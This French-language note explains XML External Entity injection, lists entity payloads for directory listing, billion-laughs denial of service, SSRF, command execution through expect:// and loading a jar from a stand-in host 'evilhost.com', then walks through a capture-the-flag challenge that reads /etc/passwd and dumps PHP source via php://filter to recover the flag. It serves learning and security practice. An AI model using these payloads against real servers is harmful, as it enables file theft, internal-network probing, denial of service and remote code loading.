# XXE

## principe

1. Injecter des balises XML qui seront interprétées par le moteur XML côté serveur
2. Définir des variables XML, appelées entités, au niveau de la définition du schéma XML
3. Ces entités permettent de référencer des fichiers présents sur le système, de contacter une URL externe, etc.

### exemple

Injecter la balise DOCTYPE afin de définir une entité qui pointe vers un fichier connu :

<!DOCTYPE test [<!ENTITY x3 SYSTEM "/"> ]>

Insérer ensuite l’entité définie, en l’occurrence &x3; dans une balise XML contenue dans le document envoyé :

<max: QUANTITY>3&x3;</max: QUANTITY>

Il est nécessaire que le serveur renvoie ce champ au navigateur afin de pouvoir récupérer le contenu du fichier


## esemple de déclaration (il faut ensuite les appeller dans le document xml)

### Directory listing : 

<!DOCTYPE test [<!ENTITY test SYSTEM "/"> ]>

### Déni de service :

<!DOCTYPE test [<!ENTITY lol "lol" <!ELEMENT test (#PCDATA)> <!ENTITY lol1 "&lol;"> <!ENTITY lol2 "&lol1;">…. <!ENTITY lol9 "&lol8;"> ]>

### SSRF (Server Side Request Forgery ) :

<!DOCTYPE test [<!ENTITY test SYSTEM "http://site:8080/manager/html"> ]>

### Exécution de code (le serveur supporte le handler expect) :

<!DOCTYPE test [<!ENTITY test SYSTEM "expect://ls"> ]>

### Upload de Jar malveillant :

<!DOCTYPE test [<!ENTITY test SYSTEM "jar://evilhost.com/shell.jar"> ]>



## Exemple de page malicieuse exploitant une XXE:

```

Tout d’abord on inspecte la page et on remarque tout de suite qu’elle nous permet de donner un lien contenant un fichier XML.
 On va récupérer un petit fichier de RSS en XML sur Wikipédia

```
?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
    <channel>
        <title>Mon site</title>
        <description>Ceci est un exemple de flux RSS 2.0</description>
        <lastBuildDate>Sat, 07 Sep 2002 00:00:01 GMT</lastBuildDate>
        <link>http://www.example.org</link>
        <item>
            <title>Actualité N°1</title>
            <description>Ceci est ma première actualité</description>
            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
            <link>http://www.example.org/actu1</link>
        </item>
        <item>
            <title>Actualité N°2</title>
            <description>Ceci est ma seconde actualité</description>
            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
            <link>http://www.example.org/actu2</link>
        </item>
    </channel>
</rss>

```

On l’héberge sur un host et on envoie l’URL du fichier : http://site.com/rss.xml

Le challenge nous affiche le résultat de notre XML sous la forme :
===================================================
Actualité N°1
===================================================
XML document is valid
===================================================
Actualité N°2
===================================================
XML document is valid

On tente donc une XML External Entity Injection (XXE) en ajoutant à notre rss.xml :
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]><title>&xxe;</title>

Cela nous affiche le contenu du fichier passwd , on essaie ensuite  avec le path de l’index du challenge mais cela n’a pas fonctionné.
 Après une recherche plus approfondie sur les XXE on apprend qu’il est  possible de les utiliser avec les PHP Filters, c’est génial on va  pouvoir faire comme pour les LFI et afficher le code source de la page  d’index en base 64.
 
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php" >
]>

  <rss version="2.0">
    <channel>
        <title>Mon site</title>
        <description>Ceci est un exemple de flux RSS 2.0</description>
        <lastBuildDate>Sat, 07 Sep 2002 00:00:01 GMT</lastBuildDate>
        <link>http://www.example.org</link>
        <item>                
            <title>&xxe;</title>
            <description>Ceci est ma première actualité</description>
            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
            <link>http://www.example.org/actu1</link>
        </item>
        <item>
            <title>Actualité N°2</title>
            <description>Ceci est ma seconde actualité</description>
            <pubDate>Sat, 07 Sep 2002 00:00:01 GMT</pubDate>
            <link>http://www.example.org/actu2</link>
        </item>        
    </channel>
</rss>

Cela nous renvoie le code chiffrée en base 64, on le dechiffre soit  avec la fonction PHP : base64_decode(data), soit avec un site en ligne  comme https://www.base64decode.org
 Dans le code source de la page d’index on trouve le flag :
 
if($user === "admin" && $pass === "c934fed17f1cac3045ddfeca34f332bc"){

                        print "Flag : c934fed17f1cac3045ddfeca34f332bc<br />";

                }

C’est gagné les amis, on a trouvé le flag qui nous permet de valider le challenge !!


```